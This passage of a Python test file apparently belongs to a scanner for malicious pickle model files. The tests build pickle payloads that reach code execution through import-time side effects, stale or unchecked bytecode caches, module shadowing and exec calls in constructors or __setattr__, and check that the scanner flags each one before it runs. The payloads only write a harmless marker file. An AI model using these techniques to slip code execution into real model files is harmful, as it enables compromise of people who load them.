    report = scan_bytes(payload, source=f"{module_name}.pkl")

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.SUSPICIOUS
    assert marker.exists() is False
    assert any(
        finding.rule_code == "NON_ALLOWLISTED_GLOBAL"
        and finding.severity == Severity.WARNING
        and finding.details.get("import_reference") == f"{module_name}.Gadget"
        for finding in report.findings
    )
    pickle.loads(payload)
    assert marker.read_text(encoding="utf-8") == "owned"


def test_scan_bytes_warns_on_source_available_import_only_custom_global(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    module_name = f"modelaudit_c095_source_payload_{uuid.uuid4().hex}"
    marker = tmp_path / "source_available_import_only_global_marker"
    source_path = tmp_path / f"{module_name}.py"
    source_path.write_text(
        f"from pathlib import Path\nPath({str(marker)!r}).write_text('owned')\nclass Gadget:\n    pass\n",
        encoding="utf-8",
    )
    monkeypatch.syspath_prepend(str(tmp_path))
    payload = f"c{module_name}\nGadget\n.".encode()

    report = scan_bytes(payload, source=f"{module_name}.pkl")

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.SUSPICIOUS
    assert marker.exists() is False
    assert any(
        finding.rule_code == "NON_ALLOWLISTED_GLOBAL"
        and finding.details.get("import_reference") == f"{module_name}.Gadget"
        for finding in report.findings
    )


def test_scan_bytes_allows_source_available_import_only_global_with_inert_initialization(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    module_name = f"modelaudit_c095_inert_source_payload_{uuid.uuid4().hex}"
    (tmp_path / f"{module_name}.py").write_text(
        "import os\n\nclass Gadget:\n    value = ('safe', os.sep)\n",
        encoding="utf-8",
    )
    monkeypatch.syspath_prepend(str(tmp_path))
    payload = f"c{module_name}\nGadget\n.".encode()

    report = scan_bytes(payload, source=f"{module_name}.pkl")

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.CLEAN
    assert all(finding.rule_code != "NON_ALLOWLISTED_GLOBAL" for finding in report.findings)


def test_scan_bytes_uses_current_import_origin_instead_of_stale_loaded_source(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    module_name = f"modelaudit_c095_stale_loaded_source_{uuid.uuid4().hex}"
    loaded_dir = tmp_path / "loaded"
    active_dir = tmp_path / "active"
    loaded_dir.mkdir()
    active_dir.mkdir()
    marker = tmp_path / "stale_loaded_source_marker"
    (loaded_dir / f"{module_name}.py").write_text("class Gadget:\n    pass\n", encoding="utf-8")
    (active_dir / f"{module_name}.py").write_text(
        f"open({str(marker)!r}, 'w').write('owned')\nclass Gadget:\n    pass\n",
        encoding="utf-8",
    )
    monkeypatch.syspath_prepend(str(loaded_dir))
    importlib.invalidate_caches()
    imported_module = importlib.import_module(module_name)
    assert Path(cast(str, imported_module.__file__)).parent == loaded_dir
    monkeypatch.syspath_prepend(str(active_dir))
    importlib.invalidate_caches()
    payload = f"c{module_name}\nGadget\n.".encode()

    try:
        report = scan_bytes(payload, source=f"{module_name}.pkl")

        assert report.status == ScanStatus.COMPLETE
        assert report.verdict == SafetyVerdict.SUSPICIOUS
        assert marker.exists() is False
        assert any(
            finding.rule_code == "NON_ALLOWLISTED_GLOBAL"
            and finding.details.get("import_reference") == f"{module_name}.Gadget"
            for finding in report.findings
        )
        sys.modules.pop(module_name, None)
        pickle.loads(payload)
        assert marker.read_text(encoding="utf-8") == "owned"
    finally:
        sys.modules.pop(module_name, None)


def test_scan_bytes_allows_inert_source_with_future_import(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    module_name = f"modelaudit_c095_future_import_{uuid.uuid4().hex}"
    (tmp_path / f"{module_name}.py").write_text(
        "from __future__ import annotations\n\nclass Gadget:\n    value: MissingType\n",
        encoding="utf-8",
    )
    monkeypatch.syspath_prepend(str(tmp_path))
    payload = f"c{module_name}\nGadget\n.".encode()

    report = scan_bytes(payload, source=f"{module_name}.pkl")

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.CLEAN
    assert all(finding.rule_code != "NON_ALLOWLISTED_GLOBAL" for finding in report.findings)


def test_scan_bytes_warns_when_package_shadows_inert_module_source(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    module_name = f"modelaudit_c095_package_shadow_{uuid.uuid4().hex}"
    marker = tmp_path / "package_shadow_marker"
    (tmp_path / f"{module_name}.py").write_text("class Gadget:\n    pass\n", encoding="utf-8")
    package_dir = tmp_path / module_name
    package_dir.mkdir()
    (package_dir / "__init__.py").write_text(
        f"open({str(marker)!r}, 'w').write('owned')\nclass Gadget:\n    pass\n",
        encoding="utf-8",
    )
    monkeypatch.syspath_prepend(str(tmp_path))
    payload = f"c{module_name}\nGadget\n.".encode()

    try:
        report = scan_bytes(payload, source=f"{module_name}.pkl")

        assert report.status == ScanStatus.COMPLETE
        assert report.verdict == SafetyVerdict.SUSPICIOUS
        assert marker.exists() is False
        assert any(
            finding.rule_code == "NON_ALLOWLISTED_GLOBAL"
            and finding.details.get("import_reference") == f"{module_name}.Gadget"
            for finding in report.findings
        )
        pickle.loads(payload)
        assert marker.read_text(encoding="utf-8") == "owned"
    finally:
        sys.modules.pop(module_name, None)


@pytest.mark.skipif(not EXTENSION_SUFFIXES, reason="Python runtime has no native extension suffix")
def test_scan_bytes_warns_when_native_extension_shadows_inert_module_source(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    module_name = f"modelaudit_c095_extension_shadow_{uuid.uuid4().hex}"
    (tmp_path / f"{module_name}.py").write_text("class Gadget:\n    pass\n", encoding="utf-8")
    (tmp_path / f"{module_name}{EXTENSION_SUFFIXES[0]}").write_bytes(b"not-a-loadable-extension")
    monkeypatch.syspath_prepend(str(tmp_path))
    payload = f"c{module_name}\nGadget\n.".encode()

    report = scan_bytes(payload, source=f"{module_name}.pkl")

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.SUSPICIOUS
    assert any(
        finding.rule_code == "NON_ALLOWLISTED_GLOBAL"
        and finding.details.get("import_reference") == f"{module_name}.Gadget"
        for finding in report.findings
    )


def test_scan_bytes_warns_when_meta_path_finder_shadows_framework_reference(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    marker = tmp_path / "meta_path_framework_shadow_marker"

    class ShadowLoader(Loader):
        def create_module(self, _spec: ModuleSpec) -> ModuleType | None:
            return None

        def exec_module(self, module: ModuleType) -> None:
            if module.__name__ == "torch._utils":
                marker.write_text("owned", encoding="utf-8")
                module.__dict__["_rebuild_tensor_v2"] = object()

    class ShadowFinder:
        def find_spec(
            self,
            fullname: str,
            _path: object = None,
            _target: object = None,
        ) -> ModuleSpec | None:
            if fullname == "torch":
                return ModuleSpec(
                    fullname,
                    ShadowLoader(),
                    origin=str(tmp_path / "torch" / "__init__.py"),
                    is_package=True,
                )
            if fullname == "torch._utils":
                return ModuleSpec(
                    fullname,
                    ShadowLoader(),
                    origin=str(tmp_path / "torch" / "_utils.py"),
                )
            return None

    monkeypatch.setattr(sys, "meta_path", [ShadowFinder(), *sys.meta_path])
    monkeypatch.delitem(sys.modules, "torch._utils", raising=False)
    monkeypatch.delitem(sys.modules, "torch", raising=False)
    payload = b"ctorch._utils\n_rebuild_tensor_v2\n."

    try:
        report = scan_bytes(payload, source="meta-path-shadowed-framework.pkl")

        assert report.status == ScanStatus.COMPLETE
        assert report.verdict == SafetyVerdict.SUSPICIOUS
        assert marker.exists() is False
        assert any(
            finding.rule_code == "NON_ALLOWLISTED_GLOBAL"
            and finding.details.get("import_reference") == "torch._utils._rebuild_tensor_v2"
            for finding in report.findings
        )
        pickle.loads(payload)
        assert marker.read_text(encoding="utf-8") == "owned"
    finally:
        sys.modules.pop("torch._utils", None)
        sys.modules.pop("torch", None)


@pytest.mark.skipif(not EXTENSION_SUFFIXES, reason="Python runtime has no native extension suffix")
def test_scan_bytes_fails_closed_when_native_extension_appears_during_source_analysis(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    module_name = f"modelaudit_c095_extension_race_{uuid.uuid4().hex}"
    (tmp_path / f"{module_name}.py").write_text("class Gadget:\n    pass\n", encoding="utf-8")
    extension_path = tmp_path / f"{module_name}{EXTENSION_SUFFIXES[0]}"
    monkeypatch.syspath_prepend(str(tmp_path))
    payload = f"c{module_name}\nGadget\n.".encode()
    real_ensure_stable = package_api._ensure_shared_source_snapshot_stable
    extension_created = False

    def create_extension_before_completion_check(report_generation: int | None) -> None:
        nonlocal extension_created
        if not extension_created:
            extension_path.write_bytes(b"not-a-loadable-extension")
            extension_created = True
        real_ensure_stable(report_generation)

    monkeypatch.setattr(
        package_api,
        "_ensure_shared_source_snapshot_stable",
        create_extension_before_completion_check,
    )

    report = scan_bytes(payload, source=f"{module_name}.pkl")

    assert extension_created is True
    assert report.status == ScanStatus.INCONCLUSIVE
    assert report.verdict == SafetyVerdict.SUSPICIOUS
    assert any(error.details.get("analysis") == "python_call_graph_source_stability" for error in report.errors)


@pytest.mark.parametrize(
    ("stdlib_module", "shadow_module", "shadow_source"),
    [
        (
            "pathlib",
            "fnmatch",
            "def fnmatch(name, pattern): return False\n"
            "def fnmatchcase(name, pattern): return False\n"
            "def translate(pattern): return 'a_a'\n",
        ),
        (
            "subprocess",
            "selectors",
            "class SelectSelector: pass\nclass PollSelector: pass\n",
        ),
    ],
)
def test_scan_bytes_warns_when_inert_source_imports_transitively_shadowable_stdlib_module(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    stdlib_module: str,
    shadow_module: str,
    shadow_source: str,
) -> None:
    module_name = f"modelaudit_c095_transitive_shadow_{uuid.uuid4().hex}"
    marker = tmp_path / f"{shadow_module}_shadow_marker"
    (tmp_path / f"{module_name}.py").write_text(
        f"import {stdlib_module}\n\nclass Gadget:\n    pass\n",
        encoding="utf-8",
    )
    (tmp_path / f"{shadow_module}.py").write_text(
        f"open({str(marker)!r}, 'w').write('owned')\n{shadow_source}",
        encoding="utf-8",
    )
    monkeypatch.syspath_prepend(str(tmp_path))
    payload = f"c{module_name}\nGadget\n.".encode()

    report = scan_bytes(payload, source=f"{module_name}.pkl")

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.SUSPICIOUS
    assert marker.exists() is False
    assert any(
        finding.rule_code == "NON_ALLOWLISTED_GLOBAL"
        and finding.details.get("import_reference") == f"{module_name}.Gadget"
        for finding in report.findings
    )
    load_payload = (
        "import importlib, pickle, sys; "
        f"sys.path.insert(0, {str(tmp_path)!r}); "
        f"sys.modules.pop({stdlib_module!r}, None); "
        f"sys.modules.pop({shadow_module!r}, None); "
        "importlib.invalidate_caches(); "
        f"pickle.loads({payload!r})"
    )
    subprocess.run([sys.executable, "-c", load_payload], check=True)
    assert marker.read_text(encoding="utf-8") == "owned"


def test_scan_bytes_warns_when_source_module_imports_side_effectful_stdlib_module(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    module_name = f"modelaudit_c095_stdlib_side_effect_{uuid.uuid4().hex}"
    (tmp_path / f"{module_name}.py").write_text(
        "import antigravity\n\nclass Gadget:\n    pass\n",
        encoding="utf-8",
    )
    monkeypatch.syspath_prepend(str(tmp_path))
    payload = f"c{module_name}\nGadget\n.".encode()

    report = scan_bytes(payload, source=f"{module_name}.pkl")

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.SUSPICIOUS
    assert any(
        finding.rule_code == "NON_ALLOWLISTED_GLOBAL"
        and finding.details.get("import_reference") == f"{module_name}.Gadget"
        for finding in report.findings
    )


def test_scan_bytes_warns_when_unchecked_hash_cache_overrides_inert_source(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    module_name = f"modelaudit_c095_unchecked_cache_{uuid.uuid4().hex}"
    marker = tmp_path / "unchecked_hash_cache_marker"
    source_path = tmp_path / f"{module_name}.py"
    source_path.write_text(
        f"open({str(marker)!r}, 'w').write('owned')\nclass Gadget:\n    pass\n",
        encoding="utf-8",
    )
    py_compile.compile(
        str(source_path),
        doraise=True,
        invalidation_mode=py_compile.PycInvalidationMode.UNCHECKED_HASH,
    )
    source_path.write_text("class Gadget:\n    pass\n", encoding="utf-8")
    monkeypatch.syspath_prepend(str(tmp_path))
    payload = f"c{module_name}\nGadget\n.".encode()

    try:
        report = scan_bytes(payload, source=f"{module_name}.pkl")

        assert report.status == ScanStatus.COMPLETE
        assert report.verdict == SafetyVerdict.SUSPICIOUS
        assert marker.exists() is False
        assert any(
            finding.rule_code == "NON_ALLOWLISTED_GLOBAL"
            and finding.details.get("import_reference") == f"{module_name}.Gadget"
            for finding in report.findings
        )
        pickle.loads(payload)
        assert marker.read_text(encoding="utf-8") == "owned"
    finally:
        sys.modules.pop(module_name, None)


def test_scan_bytes_checks_source_local_cache_with_pycache_prefix(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    module_name = f"modelaudit_c095_prefixed_cache_{uuid.uuid4().hex}"
    marker = tmp_path / "prefixed_cache_marker"
    source_path = tmp_path / f"{module_name}.py"
    source_path.write_text(
        f"open({str(marker)!r}, 'w').write('owned')\nclass Gadget:\n    pass\n",
        encoding="utf-8",
    )
    monkeypatch.setattr(sys, "pycache_prefix", None)
    py_compile.compile(
        str(source_path),
        doraise=True,
        invalidation_mode=py_compile.PycInvalidationMode.UNCHECKED_HASH,
    )
    source_path.write_text("class Gadget:\n    pass\n", encoding="utf-8")
    monkeypatch.setattr(sys, "pycache_prefix", str(tmp_path / "scanner-cache"))
    monkeypatch.syspath_prepend(str(tmp_path))
    payload = f"c{module_name}\nGadget\n.".encode()

    try:
        report = scan_bytes(payload, source=f"{module_name}.pkl")

        assert report.status == ScanStatus.COMPLETE
        assert report.verdict == SafetyVerdict.SUSPICIOUS
        assert marker.exists() is False
        assert any(
            finding.rule_code == "NON_ALLOWLISTED_GLOBAL"
            and finding.details.get("import_reference") == f"{module_name}.Gadget"
            for finding in report.findings
        )
        monkeypatch.setattr(sys, "pycache_prefix", None)
        pickle.loads(payload)
        assert marker.read_text(encoding="utf-8") == "owned"
    finally:
        sys.modules.pop(module_name, None)


def test_scan_bytes_warns_when_timestamp_cache_overrides_inert_source(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    module_name = f"modelaudit_c095_timestamp_cache_{uuid.uuid4().hex}"
    marker = tmp_path / "timestamp_cache_marker"
    source_path = tmp_path / f"{module_name}.py"
    malicious_source = f"open({str(marker)!r}, 'w').write('owned')\nclass Gadget:\n    pass\n"
    benign_source = "class Gadget:\n    pass\n"
    benign_source += "#" * (len(malicious_source.encode()) - len(benign_source.encode()))
    fixed_mtime = 1_700_000_000
    source_path.write_bytes(malicious_source.encode())
    os.utime(source_path, (fixed_mtime, fixed_mtime))
    py_compile.compile(
        str(source_path),
        doraise=True,
        invalidation_mode=py_compile.PycInvalidationMode.TIMESTAMP,
    )
    source_path.write_bytes(benign_source.encode())
    os.utime(source_path, (fixed_mtime, fixed_mtime))
    monkeypatch.syspath_prepend(str(tmp_path))
    payload = f"c{module_name}\nGadget\n.".encode()

    try:
        report = scan_bytes(payload, source=f"{module_name}.pkl")

        assert report.status == ScanStatus.COMPLETE
        assert report.verdict == SafetyVerdict.SUSPICIOUS
        assert marker.exists() is False
        assert any(
            finding.rule_code == "NON_ALLOWLISTED_GLOBAL"
            and finding.details.get("import_reference") == f"{module_name}.Gadget"
            for finding in report.findings
        )
        pickle.loads(payload)
        assert marker.read_text(encoding="utf-8") == "owned"
    finally:
        sys.modules.pop(module_name, None)


def test_scan_bytes_warns_when_optimized_cache_overrides_inert_source(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    module_name = f"modelaudit_c095_optimized_cache_{uuid.uuid4().hex}"
    marker = tmp_path / "optimized_cache_marker"
    source_path = tmp_path / f"{module_name}.py"
    malicious_source = f"open({str(marker)!r}, 'w').write('owned')\nclass Gadget:\n    pass\n"
    benign_source = "class Gadget:\n    pass\n"
    benign_source += "#" * (len(malicious_source.encode()) - len(benign_source.encode()))
    fixed_mtime = 1_700_000_000
    source_path.write_bytes(malicious_source.encode())
    os.utime(source_path, (fixed_mtime, fixed_mtime))
    py_compile.compile(
        str(source_path),
        doraise=True,
        optimize=1,
        invalidation_mode=py_compile.PycInvalidationMode.TIMESTAMP,
    )
    source_path.write_bytes(benign_source.encode())
    os.utime(source_path, (fixed_mtime, fixed_mtime))
    monkeypatch.syspath_prepend(str(tmp_path))
    payload = f"c{module_name}\nGadget\n.".encode()

    report = scan_bytes(payload, source=f"{module_name}.pkl")

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.SUSPICIOUS
    assert marker.exists() is False
    assert any(
        finding.rule_code == "NON_ALLOWLISTED_GLOBAL"
        and finding.details.get("import_reference") == f"{module_name}.Gadget"
        for finding in report.findings
    )
    load_payload = f"import pickle, sys; sys.path.insert(0, {str(tmp_path)!r}); pickle.loads({payload!r})"
    subprocess.run([sys.executable, "-O", "-c", load_payload], check=True)
    assert marker.read_text(encoding="utf-8") == "owned"


def test_scan_bytes_warns_when_higher_optimized_cache_overrides_inert_source(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    module_name = f"modelaudit_c095_higher_optimized_cache_{uuid.uuid4().hex}"
    marker = tmp_path / "higher_optimized_cache_marker"
    source_path = tmp_path / f"{module_name}.py"
    malicious_source = f"open({str(marker)!r}, 'w').write('owned')\nclass Gadget:\n    pass\n"
    benign_source = "class Gadget:\n    pass\n"
    benign_source += "#" * (len(malicious_source.encode()) - len(benign_source.encode()))
    fixed_mtime = 1_700_000_000
    source_path.write_bytes(malicious_source.encode())
    os.utime(source_path, (fixed_mtime, fixed_mtime))
    compile_module = f"import sys; sys.path.insert(0, {str(tmp_path)!r}); import {module_name}"
    subprocess.run([sys.executable, "-OOO", "-c", compile_module], check=True)
    marker.unlink()
    source_path.write_bytes(benign_source.encode())
    os.utime(source_path, (fixed_mtime, fixed_mtime))
    monkeypatch.syspath_prepend(str(tmp_path))
    payload = f"c{module_name}\nGadget\n.".encode()

    report = scan_bytes(payload, source=f"{module_name}.pkl")

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.SUSPICIOUS
    assert marker.exists() is False
    assert any(
        finding.rule_code == "NON_ALLOWLISTED_GLOBAL"
        and finding.details.get("import_reference") == f"{module_name}.Gadget"
        for finding in report.findings
    )
    load_payload = f"import pickle, sys; sys.path.insert(0, {str(tmp_path)!r}); pickle.loads({payload!r})"
    subprocess.run([sys.executable, "-OOO", "-c", load_payload], check=True)
    assert marker.read_text(encoding="utf-8") == "owned"


def test_scan_bytes_warns_when_checked_hash_cache_overrides_inert_source(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    module_name = f"modelaudit_c095_checked_cache_override_{uuid.uuid4().hex}"
    marker = tmp_path / "checked_hash_cache_marker"
    source_path = tmp_path / f"{module_name}.py"
    source_path.write_text(
        f"open({str(marker)!r}, 'w').write('owned')\nclass Gadget:\n    pass\n",
        encoding="utf-8",
    )
    py_compile.compile(
        str(source_path),
        doraise=True,
        invalidation_mode=py_compile.PycInvalidationMode.CHECKED_HASH,
    )
    source_path.write_text("class Gadget:\n    pass\n", encoding="utf-8")
    monkeypatch.syspath_prepend(str(tmp_path))
    payload = f"c{module_name}\nGadget\n.".encode()

    report = scan_bytes(payload, source=f"{module_name}.pkl")

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.SUSPICIOUS
    assert marker.exists() is False
    assert any(
        finding.rule_code == "NON_ALLOWLISTED_GLOBAL"
        and finding.details.get("import_reference") == f"{module_name}.Gadget"
        for finding in report.findings
    )
    load_payload = f"import pickle, sys; sys.path.insert(0, {str(tmp_path)!r}); pickle.loads({payload!r})"
    subprocess.run(
        [sys.executable, "--check-hash-based-pycs", "never", "-c", load_payload],
        check=True,
    )
    assert marker.read_text(encoding="utf-8") == "owned"


@pytest.mark.parametrize("optimization_suffix", ["", ".opt-1", ".opt-2", ".opt-3"])
def test_scan_bytes_warns_when_other_cpython_cache_targets_inert_source(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    optimization_suffix: str,
) -> None:
    module_name = f"modelaudit_c095_other_cpython_cache_{uuid.uuid4().hex}"
    source_path = tmp_path / f"{module_name}.py"
    source_path.write_text("class Gadget:\n    pass\n", encoding="utf-8")
    compiled_path = py_compile.compile(str(source_path), doraise=True)
    assert compiled_path is not None
    cache_path = Path(compiled_path)
    current_tag = sys.implementation.cache_tag
    assert current_tag is not None and current_tag.startswith("cpython-")
    other_tag = "cpython-313" if current_tag != "cpython-313" else "cpython-312"
    other_cache_name = cache_path.name.replace(current_tag, other_tag, 1).replace(
        ".pyc",
        f"{optimization_suffix}.pyc",
    )
    other_cache_path = cache_path.with_name(other_cache_name)
    cache_path.replace(other_cache_path)
    monkeypatch.syspath_prepend(str(tmp_path))

    report = scan_bytes(f"c{module_name}\nGadget\n.".encode(), source=f"{module_name}.pkl")

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.SUSPICIOUS
    assert any(
        finding.rule_code == "NON_ALLOWLISTED_GLOBAL"
        and finding.details.get("import_reference") == f"{module_name}.Gadget"
        for finding in report.findings
    )


def test_scan_bytes_allows_inert_source_with_unrelated_cross_version_cache(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    module_name = f"modelaudit_c095_unrelated_cross_version_{uuid.uuid4().hex}"
    source_path = tmp_path / f"{module_name}.py"
    source_path.write_text("class Gadget:\n    pass\n", encoding="utf-8")
    cache_directory = tmp_path / "__pycache__"
    cache_directory.mkdir()
    (cache_directory / "other_module.cpython-313.pyc").write_bytes(b"unrelated")
    monkeypatch.syspath_prepend(str(tmp_path))

    report = scan_bytes(f"c{module_name}\nGadget\n.".encode(), source=f"{module_name}.pkl")

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.CLEAN
    assert all(finding.rule_code != "NON_ALLOWLISTED_GLOBAL" for finding in report.findings)


def test_scan_bytes_allows_inert_source_with_stale_timestamp_cache(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    module_name = f"modelaudit_c095_stale_timestamp_cache_{uuid.uuid4().hex}"
    source_path = tmp_path / f"{module_name}.py"
    source_path.write_text("raise RuntimeError('stale cache executed')\nclass Gadget:\n    pass\n", encoding="utf-8")
    fixed_mtime = 1_700_000_000
    os.utime(source_path, (fixed_mtime, fixed_mtime))
    py_compile.compile(
        str(source_path),
        doraise=True,
        invalidation_mode=py_compile.PycInvalidationMode.TIMESTAMP,
    )
    source_path.write_text("class Gadget:\n    pass\n", encoding="utf-8")
    os.utime(source_path, (fixed_mtime + 2, fixed_mtime + 2))
    monkeypatch.syspath_prepend(str(tmp_path))

    report = scan_bytes(f"c{module_name}\nGadget\n.".encode(), source=f"{module_name}.pkl")

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.CLEAN
    assert all(finding.rule_code != "NON_ALLOWLISTED_GLOBAL" for finding in report.findings)


def test_scan_bytes_allows_inert_source_with_checked_hash_cache(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    module_name = f"modelaudit_c095_checked_cache_{uuid.uuid4().hex}"
    source_path = tmp_path / f"{module_name}.py"
    source_path.write_text("class Gadget:\n    pass\n", encoding="utf-8")
    py_compile.compile(
        str(source_path),
        doraise=True,
        invalidation_mode=py_compile.PycInvalidationMode.CHECKED_HASH,
    )
    monkeypatch.syspath_prepend(str(tmp_path))

    report = scan_bytes(f"c{module_name}\nGadget\n.".encode(), source=f"{module_name}.pkl")

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.CLEAN
    assert all(finding.rule_code != "NON_ALLOWLISTED_GLOBAL" for finding in report.findings)


def test_scan_bytes_allows_inert_source_with_nonimportable_unchecked_cache(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    module_name = f"modelaudit_c095_invalid_cache_{uuid.uuid4().hex}"
    source_path = tmp_path / f"{module_name}.py"
    source_path.write_text("class Gadget:\n    pass\n", encoding="utf-8")
    compiled_path = py_compile.compile(
        str(source_path),
        doraise=True,
        invalidation_mode=py_compile.PycInvalidationMode.UNCHECKED_HASH,
    )
    assert compiled_path is not None
    cache_path = Path(compiled_path)
    cache_bytes = cache_path.read_bytes()
    cache_path.write_bytes(b"BAD!" + cache_bytes[4:])
    monkeypatch.syspath_prepend(str(tmp_path))

    report = scan_bytes(f"c{module_name}\nGadget\n.".encode(), source=f"{module_name}.pkl")

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.CLEAN
    assert all(finding.rule_code != "NON_ALLOWLISTED_GLOBAL" for finding in report.findings)


def test_scan_bytes_warns_on_invoked_global_from_inert_source_module(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    module_name = f"modelaudit_c095_inert_invoked_payload_{uuid.uuid4().hex}"
    (tmp_path / f"{module_name}.py").write_text("class Gadget:\n    pass\n", encoding="utf-8")
    monkeypatch.syspath_prepend(str(tmp_path))
    payload = f"c{module_name}\nGadget\n)R.".encode()

    report = scan_bytes(payload, source=f"{module_name}.pkl")

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.SUSPICIOUS
    assert any(
        finding.rule_code == "NON_ALLOWLISTED_GLOBAL"
        and finding.details.get("import_reference") == f"{module_name}.Gadget"
        and finding.details.get("invoked") is True
        for finding in report.findings
    )


def test_scan_bytes_warns_when_invoked_custom_function_mutates_process_state(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    module_name = f"modelaudit_c095_process_state_{uuid.uuid4().hex}"
    environment_key = f"MODELAUDIT_C095_{uuid.uuid4().hex}"
    (tmp_path / f"{module_name}.py").write_text(
        f"import os\ndef Gadget():\n    os.environ[{environment_key!r}] = 'owned'\n",
        encoding="utf-8",
    )
    monkeypatch.syspath_prepend(str(tmp_path))
    monkeypatch.delenv(environment_key, raising=False)
    payload = f"c{module_name}\nGadget\n)R.".encode()

    report = scan_bytes(payload, source=f"{module_name}.pkl")

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.SUSPICIOUS
    assert environment_key not in os.environ
    assert any(
        finding.rule_code == "NON_ALLOWLISTED_GLOBAL"
        and finding.details.get("import_reference") == f"{module_name}.Gadget"
        and finding.details.get("invoked") is True
        for finding in report.findings
    )
    pickle.loads(payload)
    assert os.environ[environment_key] == "owned"


def test_scan_bytes_keeps_each_repeated_global_invocation_under_review(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    module_name = f"modelaudit_c095_repeated_invocation_{uuid.uuid4().hex}"
    marker = tmp_path / "repeated_invocation_marker"
    constructor_payload = f"open({str(marker)!r}, 'w').write('owned')"
    (tmp_path / f"{module_name}.py").write_text(
        "class Gadget:\n"
        "    def __new__(cls):\n"
        "        return object.__new__(cls)\n"
        "    def __init__(self):\n"
        f"        exec({constructor_payload!r})\n",
        encoding="utf-8",
    )
    monkeypatch.syspath_prepend(str(tmp_path))
    global_opcode = f"c{module_name}\nGadget\n".encode()
    payload = b"\x80\x04" + global_opcode + b")\x810" + global_opcode + b")R."

    report = scan_bytes(payload, source=f"{module_name}.pkl")

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.MALICIOUS
    assert marker.exists() is False
    assert len(report.metadata["callable_invocations"]) == 2
    assert {invocation["opcode"] for invocation in report.metadata["callable_invocations"]} == {
        "NEWOBJ",
        "REDUCE",
    }
    assert any(
        finding.rule_code == "DANGEROUS_CALL_GRAPH"
        and finding.details.get("import_reference") == f"{module_name}.Gadget"
        and finding.details.get("sink") == "builtins.exec"
        for finding in report.findings
    )
    pickle.loads(payload)
    assert marker.read_text(encoding="utf-8") == "owned"


def test_scan_bytes_blocks_build_slot_state_setattr_rce(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    module_name = f"modelaudit_c095_build_setattr_{uuid.uuid4().hex}"
    marker = tmp_path / "build_setattr_marker"
    setattr_payload = f"open({str(marker)!r}, 'w').write(value)"
    (tmp_path / f"{module_name}.py").write_text(
        "class Gadget:\n"
        "    __slots__ = ('value',)\n"
        "    def __new__(cls):\n"
        "        return object.__new__(cls)\n"
        "    def __setattr__(self, name, value):\n"
        f"        exec({setattr_payload!r})\n"
        "        object.__setattr__(self, name, value)\n",
        encoding="utf-8",
    )
    monkeypatch.syspath_prepend(str(tmp_path))
    payload = b"\x80\x04" + f"c{module_name}\nGadget\n".encode() + b")\x81N}\x8c\x05value\x8c\x05owneds\x86b."

    report = scan_bytes(payload, source=f"{module_name}.pkl")

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.MALICIOUS
    assert marker.exists() is False
    assert any(
        invocation.get("opcode") == "BUILD" and invocation.get("build_uses_slot_state") is True
        for invocation in report.metadata["callable_invocations"]
    )
    assert any(
        finding.rule_code == "DANGEROUS_CALL_GRAPH"
        and finding.details.get("import_reference") == f"{module_name}.Gadget"
        and finding.details.get("sink") == "builtins.exec"
        and finding.details.get("call_path", ())[0].endswith("Gadget.__setattr__")
        for finding in report.findings
    )
    try:
        pickle.loads(payload)
        assert marker.read_text(encoding="utf-8") == "owned"
    finally:
        sys.modules.pop(module_name, None)


def test_scan_bytes_blocks_build_slot_state_setattr_import_rce(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
